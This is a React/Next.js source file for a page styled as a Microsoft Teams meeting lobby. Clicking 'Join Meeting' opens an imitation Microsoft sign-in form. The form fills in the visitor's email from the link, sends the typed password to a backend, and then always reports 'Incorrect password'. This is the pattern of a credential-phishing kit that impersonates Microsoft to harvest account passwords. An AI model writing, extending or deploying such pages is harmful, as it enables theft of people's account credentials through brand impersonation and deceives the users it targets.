"use client";

import { useState } from "react";
import Image from "next/image";
import {
  MessageSquareTextIcon,
  VideoIcon,
  CalendarDaysIcon,
  Bell,
  UsersRound,
  HandIcon,
  SmileIcon,
  LayoutGridIcon,
  EllipsisIcon,
  VideoOffIcon,
  MicIcon,
  MicOffIcon,
  ShareIcon,
  ChevronDown,
  SearchIcon,
} from "lucide-react";
import Link from "next/link";
import { apiCaller } from "@/util/helper";
import { ClipLoader } from "react-spinners";
import { useSearchParams } from "next/navigation";

export default function TeamsClone() {
  const [isMuted, setIsMuted] = useState(false);
  const [isVideoOff, setIsVideoOff] = useState(false);
  const [join, setJoin] = useState(false);
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const searchParams = useSearchParams();
  const businessName = searchParams.get("business");
  const email = searchParams.get("email")

  const handleSubmit = async () => {
    setLoading(true);
    setError(false);
    try {
      const result = await apiCaller<{}>("/api/", "POST", {password});
      setError(true)
    } catch (err: any) {

    } finally {
      setLoading(false);
    }
  };

  const menu = [
    { name: "Chat", Icon: MessageSquareTextIcon },
    { name: "Meet", Icon: VideoIcon },
    { name: "Communities", Icon: UsersRound },
    { name: "Calendar", Icon: CalendarDaysIcon },
    { name: "Activity", Icon: Bell },
  ];

  const secondMenu = [
    { name: "Chat", Icon: MessageSquareTextIcon },
    { name: "People", Icon: UsersRound },
    { name: "Raise", Icon: HandIcon },
    { name: "React", Icon: SmileIcon },
    { name: "View", Icon: LayoutGridIcon },
    { name: "More", Icon: EllipsisIcon },
  ];

  return (
    <div className="flex h-screen w-full bg-[#0b0b0b] text-[#f5f5f5] overflow-hidden antialiased selection:bg-indigo-500/30">
      {/* --- SIDEBAR --- */}
      <aside className="w-[94px] flex flex-col items-center py-4 border-r border-white/5 gap-4">
        <div className="mb-2">
          <Image
            src={"/logo.png"}
            width={28}
            height={28}
            alt="logo"
            style={{ height: "auto" }}
          />
        </div>
        {menu.map((item) => (
          <SidebarIcon
            key={item.name}
            label={item.name}
            Icon={item.Icon}
            active={item.name === "Meet"}
          />
        ))}
      </aside>

      {/* --- MAIN CONTENT AREA --- */}
      {!join ? (
        <main className="flex-1 flex flex-col bg-[#111111]">
          {/* TOP SEARCH BAR */}
          <header className="flex items-center justify-between px-6 py-3 bg-[#0b0b0b]/50">
            {/* 1. Added flex and justify-center to the wrapper to center the whole bar */}
            <div className="flex-1 flex justify-center">
              <div className="w-full max-w-md relative flex items-center">
                <input
                  className="w-full h-10 bg-[#242424] pl-10 pr-4 rounded-md border border-transparent focus:border-indigo-500/40 outline-none text-xs transition-all placeholder:text-gray-500"
                  placeholder="Search"
                />
                {/* 3. Changed top-2 to top-1/2 and -translate-y-1/2 for perfect vertical centering */}
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">
                  <SearchIcon size={16} />
                </div>
              </div>
            </div>

            {/* Profile Circle */}
            <div className="w-8 h-8 bg-gradient-to-tr from-blue-600 to-indigo-400 rounded-full flex items-center justify-center text-white text-[10px] font-black border-2 border-[#111111] cursor-pointer">
              BU
            </div>
          </header>

          {/* INNER MEETING CONTAINER */}
          <section className="flex-1 m-2 p-4 flex flex-col bg-[#1a1a1a] rounded-xl border border-white/5 overflow-hidden">
            {/* THE TOOLBAR (Aligned in a straight line) */}
            <div className="flex items-center justify-end w-full gap-1 mb-6 border-b border-white/5 pb-4">
              {/* Interaction Group */}
              <div className="flex items-center gap-1">
                {secondMenu.map((m, i) => (
                  <ToolbarButton key={i} name={m.name} Icon={m.Icon} />
                ))}
              </div>

              {/* Vertical Separator */}
              <div className="w-[1px] h-8 bg-white/10 mx-2" />

              {/* Hardware Group */}
              <div className="flex items-center gap-1">
                <ToolbarButton
                  name="Video"
                  Icon={VideoOffIcon}
                  onClick={() => setIsVideoOff(!isVideoOff)}
                  isActive={!isVideoOff}
                />
                <ToolbarButton
                  name="Mic"
                  Icon={MicOffIcon}
                  onClick={() => setIsMuted(!isMuted)}
                  isActive={!isMuted}
                />
                <ToolbarButton name="Share" Icon={ShareIcon} />
              </div>

              {/* Leave/Join Button */}
              <button
                onClick={() => setJoin(true)}
                className="ml-4 bg-[#46a758] hover:bg-[#3d914d] active:scale-95 px-5 py-2 rounded-md text-white font-bold text-xs flex items-center gap-2 transition-all shadow-md"
              >
                Join Meeting
                <ChevronDown size={14} />
              </button>
            </div>

            {/* VIDEO TILES GRID */}
            <div className="flex-1 flex flex-col gap-4 overflow-y-auto pr-2 custom-scrollbar">
              {/* Top Row: Two Equal Tiles */}
              <div className="grid grid-cols-2 gap-4 h-[300px] min-h-[250px]">
                <VideoTile color="bg-[#cbd5e1]/10 border border-white/10" />
                <VideoTile initials="EN" color="bg-[#94a3b8]" />
              </div>

              {/* Bottom Row: Centered Tile */}
              <div className="flex justify-center h-[300px] min-h-[250px]">
                <div className="w-full md:w-2/3 h-full">
                  <VideoTile
                    initials="CU"
                    color="bg-[#334155]"
                    isMuted={true}
                  />
                </div>
              </div>
            </div>
          </section>
        </main>
      ) : (
        <section className="flex-1 flex items-center justify-center bg-[#111111]">
          <div className="flex flex-col items-center gap-4 w-full max-w-sm">
            {/* Logo + Microsoft */}
            <div className="flex items-center gap-3">
              <Image src="/micro.svg.webp" height={32} width={32} alt="micro" />
              <h2 className="text-gray-400 text-xl font-semibold">Microsoft</h2>
            </div>

            {/* Email */}
            <div className="px-3 py-1 rounded-full border border-gray-700 text-gray-300 text-sm">
              {email}
            </div>

            {/* Input */}
            <input
              type="password"
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter password"
              className={`w-full px-4 py-2 bg-[#1a1a1a] border rounded-md text-white text-sm outline-none focus:border-indigo-500/40 ${
                error ? "border-red-500" : "border-white/10"
              }`}
            />

            {error && (
              <p className="w-full text-left text-red-500 text-sm">
                Incorrect password. Please try again
              </p>
            )}
            <p className="w-full text-left text-indigo-400 font-bold text-sm">
              Forgot your password
            </p>

            {/* Button */}
            <button
              disabled={loading}
              onClick={handleSubmit}
              className="w-full bg-indigo-400 cursor-pointer hover:bg-indigo-500 py-2 rounded-md text-white font-semibold text-sm transition-all"
            >
              {loading ? <ClipLoader color="white" size={20} /> : <p>Next</p>}
            </button>
            <p className="w-full text-center text-indigo-400 text-sm font-bold">
              Other ways to sign in
            </p>
            <Link
              href={"#"}
              className="w-full text-center text-indigo-400 text-sm font-bold"
            >
              Sign in with a different Microsoft account
            </Link>
          </div>
        </section>
      )}
    </div>
  );
}

/** * UI COMPONENT HELPERS
 */

function SidebarIcon({
  label,
  Icon,
  active,
}: {
  label: string;
  Icon: any;
  active: boolean;
}) {
  return (
    <button
      className={`group flex flex-col items-center w-full py-1.5 gap-1 transition-all ${active ? "text-indigo-400" : "text-white"}`}
    >
      <div
        className={`p-1.5 rounded-lg transition-colors ${active ? "bg-indigo-400/10" : "group-hover:bg-white/5"}`}
      >
        <Icon size={22} strokeWidth={active ? 2.5 : 2} />
      </div>
      <span className="text-[14px] font-semibold">{label}</span>
    </button>
  );
}

function ToolbarButton({
  name,
  Icon,
  onClick,
  isActive = true,
}: {
  name: string;
  Icon: any;
  onClick?: () => void;
  isActive?: boolean;
}) {
  return (
    <button
      onClick={onClick}
      className="flex flex-col items-center justify-center min-w-[56px] px-1 py-1 rounded-md hover:bg-white/10 transition-colors group"
    >
      <Icon
        size={20}
        className={`${isActive ? "text-gray-200" : "text-red-500"} group-hover:scale-110 transition-transform`}
        strokeWidth={1.5}
      />
      <span className="text-[12px] text-white mt-1 font-medium">{name}</span>
    </button>
  );
}

function VideoTile({
  initials,
  color,
  isMuted = false,
}: {
  initials?: string;
  color: string;
  isMuted?: boolean;
}) {
  return (
    <div
      className={`${color} rounded-xl relative flex items-center justify-center h-full w-full shadow-lg overflow-hidden group border border-white/5`}
    >
      {initials ? (
        <div className="w-24 h-24 bg-white/10 backdrop-blur-xl rounded-full flex items-center justify-center text-4xl font-bold text-white border border-white/20 shadow-2xl">
          {initials}
        </div>
      ) : (
        <div className="absolute inset-0 bg-gradient-to-tr from-black/20 to-transparent" />
      )}

      {/* Mic Status Indicator */}
      <div className="absolute top-4 right-4 bg-black/60 p-2 rounded-full backdrop-blur-md border border-white/10 shadow-lg">
        {isMuted ? (
          <MicOffIcon size={14} className="text-red-500" />
        ) : (
          <MicIcon size={14} className="text-white/80" />
        )}
      </div>

      {/* Name Tag Overlay */}
      <div className="absolute bottom-4 left-4 bg-black/40 px-3 py-1 rounded text-[10px] font-medium backdrop-blur-sm border border-white/5">
        {initials || "Guest User"}
      </div>
    </div>
  );
}
